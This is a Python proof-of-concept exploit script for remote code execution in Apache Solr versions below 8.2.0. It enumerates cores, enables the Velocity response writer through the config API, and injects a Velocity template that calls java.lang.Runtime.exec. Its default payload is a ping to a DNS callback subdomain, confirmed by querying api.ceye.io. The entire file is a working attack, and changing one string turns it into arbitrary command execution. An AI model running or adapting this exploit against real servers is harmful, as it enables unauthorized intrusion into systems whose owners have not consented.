#!/usr/bin/env python3
#@author: badger
#@date: 2019-11-05
#
import requests
import time
import json
import sys

class PoC(object):
    name = "Apache Solr RCE"
    appName = "Apache Solr"
    appManu = "Apache Software Foundation"
    appVersion = "< 8.2.0 all version"
    updateDate = "2019-11-05"
    Platefrom = "Multiple"
    vulRefer = "Apache-Solr-8.2.0-RCE"

    def __init__(self, host, port, identifier, token):
        self.host = str(host)
        self.port = str(port)
        self.cmd = "ping -n 1 {}.{} || ping -c 1 {}.{}".format(self.vulRefer, identifier, self.vulRefer, identifier)
        self.token = token

    def _pushdata(self):
        system = InitSolr(host=self.host, port=self.port)
        if system.getnodes()['state'] == 0:
            print("No Nodes Found. Remote Exec Failed!")
        else:
            nodes = system.getnodes()['node']
            for node in nodes:
                rce = ApacheSolrRCE(host=self.host, port=self.port, node=node, cmd=self.cmd)
                init_node_config = rce.init_node_config()
                if init_node_config['state'] == 1:
                    rce._run()
                else:
                    print("Init node Failed.")

    def _check(self):
        self._pushdata()
        time.sleep(2)
        check_url = "http://api.ceye.io/v1/records?token={}&type=dns&filter=Solr-8.2.0".format(self.token)
        res = requests.get(url=check_url)
        if "Apache-Solr-8.2.0-RCE" in res.text:
            print("The target is vulnerable to {}.".format(self.vulRefer))
            return True
        else:
            print("The target seem not vulnerable to {}".format(self.vulRefer))
            return False

class ApacheSolrRCE(object):

    def __init__(self, host, port, node, cmd):
        self.host = host
        self.port = port
        self.node = node
        self.cmd = cmd
        self.url = "http://" + self.host + ':' + self.port + "/solr/" + self.node

    def init_node_config(self):
        url = self.url + "/config"
        payload = {
            'update-queryresponsewriter': {
                'startup': 'lazy',
                'name': 'velocity',
                'class': 'solr.VelocityResponseWriter',
                'template.base.dir': '',
                'solr.resource.loader.enabled': 'true',
                'params.resource.loader.enabled': 'true'
            }
        }
        try:
            res = requests.post(url=url, data=json.dumps(payload), timeout=5)
            if res.status_code == 200:
                return {
                    'init': 'Init node config successfully',
                    'state': 1
                }
            else:
                return {
                    'init': 'Init node config failed',
                    'state': 0
                }
        except:
            return {
                'init': 'Init node config failed',
                'state': 0
            }

    def _run(self):
        veri_url = self.url + ("/select?q=1&&wt=velocity&v.template=custom&v.template.custom="
                          "%23set($x=%27%27)+"
                          "%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+"
                          "%23set($chr=$x.class.forName(%27java.lang.Character%27))+"
                          "%23set($str=$x.class.forName(%27java.lang.String%27))+"
                          "%23set($ex=$rt.getRuntime().exec(%27" + self.cmd +
                          "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+"
                          "%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end")
        try:
            res = requests.get(url=veri_url, timeout=5)
        except Exception as e:
            # print(e)
            return 0
        if res.status_code == 200:
            try:
                if res.json()['responseHeader']['status'] == '0':
                    print("RCE failed @Apache Solr node %s\n" % self.node)
                    return 0
                else:
                    print("RCE failed @Apache Solr node %s\n" % self.node)
                    return 0
            except Exception as e:
                # print(e)
                print("RCE Successfully @Apache Solr node %s\n %s\n" % (self.node, res.text.strip().strip('0')))
                return 1
        else:
            print("Veri_URL cannot be reachee")
            return 0
        

class InitSolr(object):
    timestamp_s = str(time.time()).split('.')
    timestamp = timestamp_s[0] + timestamp_s[1][0:-3]

    def __init__(self, host, port):
        self.host = host
        self.port = port

    def getnodes(self):
        payload = {
            '_': self.timestamp,
            'indexInfo': 'false',
            'wt': 'json'
        }
        url = "http://" + self.host + ":" + self.port + "/solr/admin/cores"
        try:
            nodes_info = requests.get(url=url, params=payload, timeout=5)
            node = list(nodes_info.json()['status'].keys())
            state = 1
        except Exception as e:
            node = ''
            state = 0

        if state:
            return {
                'node': node,
                'state': state,
                'msg': 'Get Nodes Successfully'
            }
        else:
            return {
                'node': None,
                'state': state,
                'msg': 'Get Nodes Successfully'
            }

if __name__ == '__main__':
    try:
        host = sys.argv[1]
        port = sys.argv[2]
        identifier = sys.argv[3]
        token = sys.argv[4]
    except:
        print("Usage:")
        exit(-1)

    poc = PoC(host, port, identifier, token)
    poc._check()

